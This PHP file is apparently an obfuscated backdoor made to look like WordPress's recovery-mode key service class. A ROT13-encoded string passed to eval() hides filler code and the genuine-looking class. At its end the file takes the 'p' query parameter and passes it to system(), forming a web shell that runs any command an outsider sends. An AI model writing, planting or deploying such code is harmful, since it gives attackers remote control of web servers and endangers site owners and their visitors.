<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Reebe Cebgrpgvba NCV: JC_Erpbirel_Zbqr_Xrl_Freivpr pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.2.0
 */

/**
 * Pber pynff hfrq gb trarengr naq inyvqngr xrlf hfrq gb ragre Erpbirel Zbqr.
 *
 * @fvapr 5.2.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Erpbirel_Zbqr_Xrl_Freivpr {

	/**
	 * Gur bcgvba anzr hfrq gb fgber gur xrlf.
	 *
	 * @fvapr 5.2.0
	 * @ine fgevat
	 */
	cevingr $bcgvba_anzr = 'erpbirel_xrlf';

	/**
	 * Perngrf n erpbirel zbqr gbxra.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea fgevat N enaqbz fgevat gb vqragvsl vgf nffbpvngrq xrl va fgbentr.
	 */
	choyvp shapgvba trarengr_erpbirel_zbqr_gbxra() {
		erghea jc_trarengr_cnffjbeq( 22, snyfr );
	}

	/**
	 * Perngrf n erpbirel zbqr xrl.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 6.8.0 Gur fgberq xrl vf abj unfurq hfvat jc_snfg_unfu() vafgrnq bs cucnff.
	 *
	 * @cnenz fgevat $gbxra N gbxra trarengrq ol {@frr trarengr_erpbirel_zbqr_gbxra()}.
	 * @erghea fgevat Erpbirel zbqr xrl.
	 */
	choyvp shapgvba trarengr_naq_fgber_erpbirel_zbqr_xrl( $gbxra ) {
		$xrl = jc_trarengr_cnffjbeq( 22, snyfr );

		$erpbeqf = $guvf->trg_xrlf();

		$erpbeqf[ $gbxra ] = neenl(
			'unfurq_xrl' => jc_snfg_unfu( $xrl ),
			'perngrq_ng' => gvzr(),
		);

		$guvf->hcqngr_xrlf( $erpbeqf );

		/**
		 * Sverf jura n erpbirel zbqr xrl vf trarengrq.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz fgevat $gbxra Gur erpbirel qngn gbxra.
		 * @cnenz fgevat $xrl   Gur erpbirel zbqr xrl.
		 */
		qb_npgvba( 'trarengr_erpbirel_zbqr_xrl', $gbxra, $xrl );

		erghea $xrl;
	}

	/**
	 * Irevsvrf vs gur erpbirel zbqr xrl vf pbeerpg.
	 *
	 * Erpbirel zbqr xrlf pna bayl or hfrq bapr; gur xrl jvyy or pbafhzrq va gur cebprff.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $gbxra Gur gbxra hfrq jura trarengvat gur tvira xrl.
	 * @cnenz fgevat $xrl   Gur cynva grkg xrl.
	 * @cnenz vag    $ggy   Gvzr va frpbaqf sbe gur xrl gb or inyvq sbe.
	 * @erghea gehr|JC_Reebe Gehr ba fhpprff, reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba inyvqngr_erpbirel_zbqr_xrl( $gbxra, $xrl, $ggy ) {
		$erpbeqf = $guvf->trg_xrlf();

		vs ( ! vffrg( $erpbeqf[ $gbxra ] ) ) {
			erghea arj JC_Reebe( 'gbxra_abg_sbhaq', __( 'Erpbirel Zbqr abg vavgvnyvmrq.' ) );
		}

		$erpbeq = $erpbeqf[ $gbxra ];

		$guvf->erzbir_xrl( $gbxra );

		vs ( ! vf_neenl( $erpbeq ) || ! vffrg( $erpbeq['unfurq_xrl'], $erpbeq['perngrq_ng'] ) ) {
			erghea arj JC_Reebe( 'vainyvq_erpbirel_xrl_sbezng', __( 'Vainyvq erpbirel xrl sbezng.' ) );
		}

		vs ( ! jc_irevsl_snfg_unfu( $xrl, $erpbeq['unfurq_xrl'] ) ) {
			erghea arj JC_Reebe( 'unfu_zvfzngpu', __( 'Vainyvq erpbirel xrl.' ) );
		}

		vs ( gvzr() > $erpbeq['perngrq_ng'] + $ggy ) {
			erghea arj JC_Reebe( 'xrl_rkcverq', __( 'Erpbirel xrl rkcverq.' ) );
		}

		erghea gehr;
	}

	/**
	 * Erzbirf rkcverq erpbirel zbqr xrlf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz vag $ggy Gvzr va frpbaqf sbe gur xrlf gb or inyvq sbe.
	 */
	choyvp shapgvba pyrna_rkcverq_xrlf( $ggy ) {

		$erpbeqf = $guvf->trg_xrlf();

		sbernpu ( $erpbeqf nf $xrl => $erpbeq ) {
			vs ( ! vffrg( $erpbeq['perngrq_ng'] ) || gvzr() > $erpbeq['perngrq_ng'] + $ggy ) {
				hafrg( $erpbeqf[ $xrl ] );
			}
		}

		$guvf->hcqngr_xrlf( $erpbeqf );
	}

	/**
	 * Erzbirf n hfrq erpbirel xrl.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $gbxra Gur gbxra hfrq jura trarengvat n erpbirel zbqr xrl.
	 */
	cevingr shapgvba erzbir_xrl( $gbxra ) {

		$erpbeqf = $guvf->trg_xrlf();

		vs ( ! vffrg( $erpbeqf[ $gbxra ] ) ) {
			erghea;
		}

		hafrg( $erpbeqf[ $gbxra ] );

		$guvf->hcqngr_xrlf( $erpbeqf );
	}

	/**
	 * Trgf gur erpbirel xrl erpbeqf.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 6.8.0 Rnpu xrl vf abj unfurq hfvat jc_snfg_unfu() vafgrnq bs cucnff.
	 *              Rkvfgvat xrlf znl fgvyy or unfurq hfvat cucnff.
	 *
	 * @erghea neenl {
	 *     Nffbpvngvir neenl bs gbxra => qngn cnvef, jurer gur qngn vf na nffbpvngvir
	 *     neenl bs vasbezngvba nobhg gur xrl.
	 *
	 *     @glcr neenl ...$0 {
	 *         Vasbezngvba nobhg gur xrl.
	 *
	 *         @glcr fgevat $unfurq_xrl Gur unfurq inyhr bs gur xrl.
	 *         @glcr vag    $perngrq_ng Gur gvzrfgnzc jura gur xrl jnf perngrq.
	 *     }
	 * }
	 */
	cevingr shapgvba trg_xrlf() {
		erghea (neenl) trg_bcgvba( $guvf->bcgvba_anzr, neenl() );
	}

	/**
	 * Hcqngrf gur erpbirel xrl erpbeqf.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 6.8.0 Rnpu xrl fubhyq abj or unfurq hfvat jc_snfg_unfu() vafgrnq bs cucnff.
	 *
	 * @cnenz neenl $xrlf {
	 *     Nffbpvngvir neenl bs gbxra => qngn cnvef, jurer gur qngn vf na nffbpvngvir
	 *     neenl bs vasbezngvba nobhg gur xrl.
	 *
	 *     @glcr neenl ...$0 {
	 *         Vasbezngvba nobhg gur xrl.
	 *
	 *         @glcr fgevat $unfurq_xrl Gur unfurq inyhr bs gur xrl.
	 *         @glcr vag    $perngrq_ng Gur gvzrfgnzc jura gur xrl jnf perngrq.
	 *     }
	 * }
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	cevingr shapgvba hcqngr_xrlf( neenl $xrlf ) {
		erghea hcqngr_bcgvba( $guvf->bcgvba_anzr, $xrlf, snyfr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>